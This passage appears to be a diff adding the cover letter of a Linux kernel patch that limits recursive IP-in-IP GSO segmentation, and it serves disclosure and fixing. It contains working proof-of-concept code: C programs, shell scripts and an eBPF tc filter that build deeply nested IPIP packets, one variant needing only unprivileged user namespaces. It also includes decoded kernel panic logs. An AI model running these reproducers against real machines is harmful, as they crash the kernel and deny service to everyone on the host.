+exec perl -MIO::Socket::INET -e 'my $s = IO::Socket::INET->new(LocalAddr => "198.18.0.2", LocalPort => 4242, Listen => 1, ReuseAddr => 1) or die "server: $!\n"; my $c = $s->accept() or die "accept: $!\n"; my $buf; while (read($c, $buf, 65536)) {}'------END net-server-perl.sh--------
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+static void usage(const char *prog)
+{
+	fprintf(stderr, "Usage: %s <ip> <port> <bytes>\n", prog);
+}
+
+int main(int argc, char **argv)
+{
+	struct sockaddr_in addr;
+	char *buf;
+	unsigned long port;
+	unsigned long total;
+	size_t off = 0;
+	int one = 1;
+	int fd;
+
+	if (argc != 4) {
+		usage(argv[0]);
+		return 1;
+	}
+
+	port = strtoul(argv[2], NULL, 0);
+	total = strtoul(argv[3], NULL, 0);
+	if (port > 65535 || total == 0) {
+		fprintf(stderr, "invalid port or byte count\n");
+		return 1;
+	}
+
+	buf = malloc(total);
+	if (!buf) {
+		perror("malloc");
+		return 1;
+	}
+	for (off = 0; off < total; off++)
+		buf[off] = 'A' + (off % 23);
+
+	fd = socket(AF_INET, SOCK_STREAM, 0);
+	if (fd < 0) {
+		perror("socket");
+		free(buf);
+		return 1;
+	}
+
+	if (setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)) < 0) {
+		perror("setsockopt(TCP_NODELAY)");
+		close(fd);
+		free(buf);
+		return 1;
+	}
+
+	memset(&addr, 0, sizeof(addr));
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons((uint16_t)port);
+	if (inet_pton(AF_INET, argv[1], &addr.sin_addr) != 1) {
+		fprintf(stderr, "invalid IPv4 address\n");
+		close(fd);
+		free(buf);
+		return 1;
+	}
+
+	if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+		perror("connect");
+		close(fd);
+		free(buf);
+		return 1;
+	}
+
+	off = 0;
+	while (off < total) {
+		ssize_t n = send(fd, buf + off, total - off, 0);
+
+		if (n < 0) {
+			perror("send");
+			close(fd);
+			free(buf);
+			return 1;
+		}
+		off += (size_t)n;
+	}
+
+	fprintf(stderr, "sent %lu bytes to %s:%lu\n", total, argv[1], port);
+	close(fd);
+	free(buf);
+	return 0;
+}
+------END poc.c--------
+
+------BEGIN poc.sh------
+#!/bin/sh
+set -eu
+
+DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
+
+NS=${NS:-q7xns}
+OUTER_DEV0=${OUTER_DEV0:-q7xveth0}
+OUTER_DEV1=${OUTER_DEV1:-q7xveth1}
+OUTER0=${OUTER0:-10.10.0.1/24}
+OUTER1=${OUTER1:-10.10.0.2/24}
+OUTER0_IP=${OUTER0_IP:-10.10.0.1}
+OUTER1_IP=${OUTER1_IP:-10.10.0.2}
+TUN0=${TUN0:-q7xipip0}
+TUN1=${TUN1:-q7xipip1}
+INNER0_IP=${INNER0_IP:-198.18.0.1}
+INNER1_IP=${INNER1_IP:-198.18.0.2}
+TARGET_IP=${TARGET_IP:-198.18.0.2}
+PORT=${PORT:-4242}
+SEND_BYTES=${SEND_BYTES:-65536}
+SERVER_PIDFILE=/tmp/q7x-server.pid
+
+cleanup() {
+	tc qdisc del dev "$OUTER_DEV0" clsact 2>/dev/null || true
+	ip link del "$TUN0" 2>/dev/null || true
+	ip netns del "$NS" 2>/dev/null || true
+	ip link del "$OUTER_DEV0" 2>/dev/null || true
+	rm -f "$SERVER_PIDFILE"
+}
+
+trap cleanup EXIT
+
+gcc -O2 -Wall -Wextra -o "$DIR/poc" "$DIR/poc.c"
+if [ ! -f "$DIR/tc_mutate.bpf.o" ]; then
+	echo "missing tc_mutate.bpf.o; build it on the host with: make -C $DIR" >&2
+	exit 1
+fi
+
+cleanup
+
+ip netns add "$NS"
+ip link add "$OUTER_DEV0" type veth peer name "$OUTER_DEV1"
+ip link set "$OUTER_DEV1" netns "$NS"
+
+ip addr add "$OUTER0" dev "$OUTER_DEV0"
+ip link set "$OUTER_DEV0" up
+ip netns exec "$NS" ip addr add "$OUTER1" dev "$OUTER_DEV1"
+ip netns exec "$NS" ip link set lo up
+ip netns exec "$NS" ip link set "$OUTER_DEV1" up
+
+ethtool -K "$OUTER_DEV0" tso off gso off gro off sg off >/dev/null 2>&1 || true
+
+ip link add "$TUN0" type ipip local "$OUTER0_IP" remote "$OUTER1_IP" dev "$OUTER_DEV0"
+ip addr add "$INNER0_IP" peer "$INNER1_IP" dev "$TUN0"
+ip link set "$TUN0" up
+
+ip netns exec "$NS" ip link add "$TUN1" type ipip local "$OUTER1_IP" remote "$OUTER0_IP" dev "$OUTER_DEV1"
+ip netns exec "$NS" ip addr add "$INNER1_IP" peer "$INNER0_IP" dev "$TUN1"
+ip netns exec "$NS" ip link set "$TUN1" up
+
+tc qdisc add dev "$OUTER_DEV0" clsact
+tc filter add dev "$OUTER_DEV0" egress bpf da obj "$DIR/tc_mutate.bpf.o" sec tc
+
+if command -v python3 >/dev/null 2>&1; then
+    ip netns exec "$NS" python3 - <<'PY' &
+import socket
+import sys
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(("198.18.0.2", 4242))
+s.listen(1)
+conn, _ = s.accept()
+while conn.recv(65535):
+    pass
+PY
+else
+    echo "using Perl listener: $DIR/net-server-perl.sh" >&2
+    ip netns exec "$NS" "$DIR/net-server-perl.sh" &
+fi
+echo $! > "$SERVER_PIDFILE"
+sleep 1
+
+"$DIR/poc" "$TARGET_IP" "$PORT" "$SEND_BYTES"
+sleep 2
+------END poc.sh--------
+
+------BEGIN tc_mutate.bpf.c------
+#include <linux/bpf.h>
+#include <linux/if_ether.h>
+#include <linux/ip.h>
+#include <linux/pkt_cls.h>
+#include <linux/tcp.h>
+#include <stddef.h>
+
+#ifndef INSERTED_IPS
+#define INSERTED_IPS 199
+#endif
+
+#ifndef TRIGGER_PORT
+#define TRIGGER_PORT 4242
+#endif
+
+#ifndef IP_DF
+#define IP_DF 0x4000
+#endif
+
+#ifndef IPPROTO_IPIP
+#define IPPROTO_IPIP 4
+#endif
+
+#ifndef IPPROTO_TCP
+#define IPPROTO_TCP 6
+#endif
+
+#define SEC(NAME) __attribute__((section(NAME), used))
+#define bpf_htons(x) ((__be16)__builtin_bswap16((__u16)(x)))
+#define bpf_ntohs(x) ((__u16)__builtin_bswap16((__u16)(x)))
+#define bpf_htonl(x) ((__be32)__builtin_bswap32((__u32)(x)))
+
+#define INSERTED_LEN (INSERTED_IPS * (__u32)sizeof(struct iphdr))
+
+static long (*bpf_skb_load_bytes)(struct __sk_buff *skb, __u32 off,
+				  void *to, __u32 len) =
+	(void *)BPF_FUNC_skb_load_bytes;
+static long (*bpf_skb_adjust_room)(struct __sk_buff *skb, __s32 len_diff,
+				   __u32 mode, __u64 flags) =
+	(void *)BPF_FUNC_skb_adjust_room;
+static long (*bpf_skb_store_bytes)(struct __sk_buff *skb, __u32 off,
+				   const void *from, __u32 len,
+				   __u64 flags) =
+	(void *)BPF_FUNC_skb_store_bytes;
+static long (*bpf_l3_csum_replace)(struct __sk_buff *skb, __u32 off,
+				   __u64 from, __u64 to, __u64 size) =
+	(void *)BPF_FUNC_l3_csum_replace;
+
+static __always_inline int load_bytes(struct __sk_buff *skb, __u32 off,
+				      void *dst, __u32 len)
+{
+	return bpf_skb_load_bytes(skb, off, dst, len);
+}
+
+SEC("tc")
+int mutate_gso_chain(struct __sk_buff *skb)
+{
+	struct iphdr outer;
+	struct iphdr inner;
+	struct tcphdr th;
+	__u32 off = sizeof(struct ethhdr);
+	__u32 ins_off = off + sizeof(struct iphdr);
+	__u16 new_tot;
+	int i;
+
+	if (skb->protocol != bpf_htons(ETH_P_IP))
+		return TC_ACT_OK;
+	if (skb->len < 2000)
+		return TC_ACT_OK;
+	if (load_bytes(skb, off, &outer, sizeof(outer)) < 0)
+		return TC_ACT_OK;
+	if (outer.version != 4 || outer.ihl != 5 || outer.protocol != IPPROTO_IPIP)
+		return TC_ACT_OK;
+	if (load_bytes(skb, ins_off, &inner, sizeof(inner)) < 0)
+		return TC_ACT_OK;
+	if (inner.version != 4 || inner.ihl != 5 || inner.protocol != IPPROTO_TCP)
+		return TC_ACT_OK;
+	if (load_bytes(skb, ins_off + sizeof(inner), &th, sizeof(th)) < 0)
+		return TC_ACT_OK;
+	if (th.dest != bpf_htons(TRIGGER_PORT))
+		return TC_ACT_OK;
+	if (bpf_skb_adjust_room(skb, INSERTED_LEN, BPF_ADJ_ROOM_NET,
+				BPF_F_ADJ_ROOM_FIXED_GSO |
+				BPF_F_ADJ_ROOM_NO_CSUM_RESET) < 0)
+		return TC_ACT_SHOT;
+
+	new_tot = bpf_htons(bpf_ntohs(outer.tot_len) + INSERTED_LEN);
+	bpf_l3_csum_replace(skb, off + offsetof(struct iphdr, check),
+			    outer.tot_len, new_tot, sizeof(new_tot));
+	bpf_skb_store_bytes(skb, off + offsetof(struct iphdr, tot_len),
+			    &new_tot, sizeof(new_tot), 0);
+
+	for (i = 0; i < INSERTED_IPS; i++) {
+		struct iphdr iph = {};
+
+		iph.version = 4;
+		iph.ihl = 5;
+		iph.ttl = 64;
+		iph.protocol = IPPROTO_IPIP;
+		iph.frag_off = bpf_htons(IP_DF);
+		iph.id = bpf_htons((__u16)(i + 1));
+		iph.saddr = bpf_htonl(0x0a010001u + (__u32)i);
+		iph.daddr = bpf_htonl(0x0a020001u + (__u32)i);
+
+		if (bpf_skb_store_bytes(skb,
+					ins_off + ((__u32)i * sizeof(struct iphdr)),
+					&iph, sizeof(iph), 0) < 0)
+			return TC_ACT_SHOT;
+	}
+
+	return TC_ACT_OK;
+}
+
+char _license[] SEC("license") = "GPL";
+------END tc_mutate.bpf.c--------
+
+------BEGIN poc_privilege_optimized.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/udp.h>
+#include <netinet/in.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#ifndef UDP_SEGMENT
+#define UDP_SEGMENT 103
+#endif
+#ifndef SOL_UDP
+#define SOL_UDP 17
+#endif
+
+struct ipv4_min {
+	uint8_t version_ihl;
+	uint8_t tos;
+	uint16_t tot_len;
+	uint16_t id;
+	uint16_t frag_off;
+	uint8_t ttl;
+	uint8_t protocol;
+	uint16_t check;
+	uint32_t saddr;
+	uint32_t daddr;
+} __attribute__((packed));
+
+static void fill_ipip(struct ipv4_min *iph, unsigned int id, uint8_t protocol)
+{
+	memset(iph, 0, sizeof(*iph));
+	iph->version_ihl = 0x45;
+	iph->tot_len = htons(sizeof(*iph)); /* parser does not use this field */
+	iph->id = htons((uint16_t)id);
+	iph->ttl = 64;
+	iph->protocol = protocol;
+	iph->saddr = htonl(0x0a000001U);
+	iph->daddr = htonl(0x0a000002U);
+}
+
+int main(int argc, char **argv)
+{
+	struct sockaddr_in bind_addr = { .sin_family = AF_INET };
+	struct sockaddr_in dst = { .sin_family = AF_INET };
+	struct msghdr msg = {0};
+	struct iovec iov;
+	unsigned char control[CMSG_SPACE(sizeof(uint16_t))];
+	struct cmsghdr *cm;
+	unsigned char *payload;
+	unsigned int depth, segsz, payload_len, i;
+	ssize_t ret;
+	int fd;
+
+	if (argc != 5) {
+		fprintf(stderr, "usage: %s DEST PORT DEPTH GSO_SIZE\n", argv[0]);
+		return 2;
+	}
+	depth = strtoul(argv[3], NULL, 0);
+	segsz = strtoul(argv[4], NULL, 0);
+	if (depth < 1 || depth > 3000 || segsz < 1 || segsz > 65535) {
+		fprintf(stderr, "invalid depth or GSO size\n");
+		return 2;
+	}
+
+	/*
+	 * After tc changes the original inner IPv4 protocol UDP -> IPIP,
+	 * the 8-byte UDP header and payload[0..11] are parsed as an IPv4
+	 * header.  Source port 0x4500 supplies version=4, IHL=5.  payload[1]
+	 * supplies protocol=IPIP.  The explicit headers start at payload+12.
+	 */
+	payload_len = 12 + depth * sizeof(struct ipv4_min) + 64;
+	if (payload_len > 65507) {
+		fprintf(stderr, "payload too large: %u\n", payload_len);
+		return 2;
+	}
+	payload = calloc(1, payload_len);
+	if (!payload) {
+		perror("calloc");
+		return 1;
+	}
+	payload[0] = 64;
+	payload[1] = IPPROTO_IPIP;
+	for (i = 0; i < depth; i++)
+		fill_ipip((struct ipv4_min *)(payload + 12 + i * 20), i,
+			  i + 1 == depth ? IPPROTO_UDP : IPPROTO_IPIP);
+
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0) {
+		perror("socket");
+		return 1;
+	}
+	bind_addr.sin_port = htons(0x4500);
+	bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+	if (bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
+		perror("bind(0x4500)");
+		return 1;
+	}
+	if (inet_pton(AF_INET, argv[1], &dst.sin_addr) != 1) {
+		fprintf(stderr, "bad destination\n");
+		return 2;
+	}
+	dst.sin_port = htons((uint16_t)strtoul(argv[2], NULL, 0));
+
+	iov.iov_base = payload;
+	iov.iov_len = payload_len;
+	msg.msg_name = &dst;
+	msg.msg_namelen = sizeof(dst);
+	msg.msg_iov = &iov;
+	msg.msg_iovlen = 1;
+	msg.msg_control = control;
+	msg.msg_controllen = sizeof(control);
+	memset(control, 0, sizeof(control));
+	cm = CMSG_FIRSTHDR(&msg);
+	cm->cmsg_level = SOL_UDP;
+	cm->cmsg_type = UDP_SEGMENT;
+	cm->cmsg_len = CMSG_LEN(sizeof(uint16_t));
+	*(uint16_t *)CMSG_DATA(cm) = (uint16_t)segsz;
+
+	fprintf(stderr, "uid=%u euid=%u send UDP_SEGMENT payload=%u depth=%u gso_size=%u source_port=0x4500\n",
+		(unsigned)getuid(), (unsigned)geteuid(), payload_len, depth, segsz);
+	ret = sendmsg(fd, &msg, 0);
+	if (ret < 0) {
+		fprintf(stderr, "sendmsg: %s (%d)\n", strerror(errno), errno);
+		return 1;
+	}
+	fprintf(stderr, "sendmsg returned %zd\n", ret);
+	close(fd);
+	free(payload);
+	return ret == (ssize_t)payload_len ? 0 : 1;
+}
+------END poc_privilege_optimized.c--------
+
+------BEGIN poc_privilege_optimized.sh------
+#!/bin/sh
+set -eu
+
+PATH=/usr/sbin:/usr/bin:/sbin:/bin
+export PATH
+
+DEPTH=${1:-180}
+GSO_SIZE=${2:-4096}
+
+echo "launcher uid=$(id -u) gid=$(id -g)"
+echo "status before unshare: $(awk '/^Uid:|^Gid:|^Cap/ {printf "%s ", $0}' /proc/self/status)"
+
+exec unshare --user --map-root-user --net sh -eu -c '
+	echo "inside uid=$(id -u) gid=$(id -g)"
+	echo "uid_map: $(tr "\n" ";" </proc/self/uid_map)"
+	echo "gid_map: $(tr "\n" ";" </proc/self/gid_map)"
+	echo "status: $(awk '\''/^Uid:|^Gid:|^Cap/ {printf "%s ", $0}'\'' /proc/self/status)"
+
+	ip link add q7dummy type dummy
+	ip addr add 10.23.0.1/32 dev q7dummy
+	ip link set q7dummy up
+	ip route add 10.23.0.2/32 dev q7dummy
+
+	ip link add q7tun type ipip local 10.23.0.1 remote 10.23.0.2 dev q7dummy
+	ip addr add 198.18.7.1 peer 198.18.7.2 dev q7tun
+	ip link set q7tun up
+
+	# Make segmentation happen in software after the egress action.  Offset 29
+	# is the protocol byte of the original inner IPv4 header (20 + 9).
+	ethtool -K q7dummy tso off gso off gro off sg off \
+		tx-ipxip4-segmentation off tx-udp-segmentation off
+	tc qdisc add dev q7dummy clsact
+	tc filter add dev q7dummy egress protocol ip pref 1 matchall \
+		action pedit munge offset 29 u8 set 4
+
+	./poc_privilege_optimized 198.18.7.2 9000 "$1" "$2"
+' sh "$DEPTH" "$GSO_SIZE"
+------END poc_privilege_optimized.sh--------
 
 
+The crash log excerpts below are copied from the unpatched namespace-only
+and BPF/veth runs on 88c17de85ddb. Both were decoded with
+scripts/decode_stacktrace.sh using the matching unpatched vmlinux;
+each label identifies the corresponding run.
+
+----BEGIN crash log----
+[namespace-only, UID 65534, unpatched 88c17de85ddb]
+[   11.336820] BUG: TASK stack guard page was hit at ffff9ab440aebff8 (stack is ffff9ab440aec000..ffff9ab440af0000)
+[   11.336823] Oops: stack guard page: 0000 [#1] SMP NOPTI
+[   11.336825] CPU: 0 UID: 65534 PID: 403 Comm: poc_privilege_o Not tainted 7.2.0-rc4-g88c17de85ddb #1 PREEMPT(lazy) 
+[   11.336826] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   11.336827] RIP: 0010:skb_copy_bits (net/core/skbuff.c:3061)
+[   11.336869] Call Trace:
+[   11.336882]  <TASK>
+[   11.336884]  __pskb_pull_tail (net/core/skbuff.c:2892 (discriminator 2))
+[   11.336885]  ? skb_copy_bits (net/core/skbuff.c:3061)
+[   11.336886]  inet_gso_segment (include/linux/skbuff.h:2873 (discriminator 1) include/linux/skbuff.h:2882 (discriminator 1) net/ipv4/af_inet.c:1379 (discriminator 1))
+[   11.336889]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336891]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336892]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336893]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336894]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336896]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336897]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336898]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336899]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336901]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336902]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.336903]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   11.337200] Kernel panic - not syncing: Fatal exception in interrupt
+
+[BPF/veth, unpatched 88c17de85ddb]
+[   18.344957] BUG: TASK stack guard page was hit at ffff9d2180bb3fe8 (stack is ffff9d2180bb4000..ffff9d2180bb8000)
+[   18.344962] Oops: stack guard page: 0000 [#1] SMP NOPTI
+[   18.344964] CPU: 1 UID: 0 PID: 433 Comm: poc Not tainted 7.2.0-rc4-g88c17de85ddb #1 PREEMPT(lazy) 
+[   18.344966] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   18.344967] RIP: 0010:inet_gso_segment (net/ipv4/af_inet.c:1404 (discriminator 1))
+[   18.345011] CR2: ffff9d2180bb3fe8 CR3: 000000000dcd8003 CR4: 0000000000370ef0
+[   18.345012] Call Trace:
+[   18.345035]  <TASK>
+[   18.345036]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345039]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345040]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345042]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345043]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345045]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345047]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345048]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345050]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345051]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345053]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345054]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345056]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345057]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345059]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345060]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345281]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345282]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345284]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345285]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345287]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345288]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345290]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345291]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345293]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345295]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345296]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345298]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345299]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345301]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345302]  skb_mac_gso_segment (net/core/gso.c:53)
+[   18.345305]  __skb_gso_segment (net/core/gso.c:124)
+[   18.345306]  validate_xmit_skb.isra.0 (include/net/gso.h:83 net/core/dev.c:4044)
+[   18.345309]  __dev_queue_xmit (net/core/dev.c:4865)
+[   18.345312]  ip_finish_output2 (include/linux/netdevice.h:3446 include/net/neighbour.h:544 include/net/neighbour.h:558 net/ipv4/ip_output.c:236)
+[   18.345315]  ip_output (net/ipv4/ip_output.c:443 net/ipv4/ip_output.c:324 include/linux/netfilter.h:307 net/ipv4/ip_output.c:437)
+[   18.345317]  ? __pfx_ip_finish_output (include/net/dst.h:470 (discriminator 7))
+[   18.345318]  iptunnel_xmit (net/ipv4/ip_tunnel_core.c:97)
+[   18.345321]  ip_tunnel_xmit (net/ipv4/ip_tunnel.c:848)
+[   18.345323]  ipip_tunnel_xmit (net/ipv4/ipip.c:316)
+[   18.345325]  dev_hard_start_xmit (include/linux/netdevice.h:5400 include/linux/netdevice.h:5409 net/core/dev.c:3889 net/core/dev.c:3905)
+[   18.345326]  ? validate_xmit_skb.isra.0 (net/core/dev.c:4067)
+[   18.345328]  __dev_queue_xmit (net/core/dev.c:4878)
+[   18.345375] Kernel panic - not syncing: Fatal exception in interrupt
+[   18.346542] Kernel Offset: 0x38800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
+[   19.982144] ---[ end Kernel panic - not syncing: Fatal exception in interrupt ]---
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (1):
+  net: gso: limit recursive IP-in-IP segmentation
+
+ include/net/gso.h       | 29 +++++++++++++++++++++++++++++
+ net/core/gso.c          |  7 +++++--
+ net/ipv4/af_inet.c      |  7 ++++++-
+ net/ipv4/esp4_offload.c |  9 +++++++--
+ net/ipv4/gre_offload.c  |  2 ++
+ net/ipv4/udp_offload.c  |  4 +++-
+ net/ipv6/esp6_offload.c |  9 +++++++--
+ net/ipv6/ip6_offload.c  | 11 ++++++++++-
+ net/mpls/mpls_gso.c     |  2 ++
+ net/nsh/nsh.c           |  2 ++
+ 10 files changed, 73 insertions(+), 9 deletions(-)
+
+-- 
+2.43.0
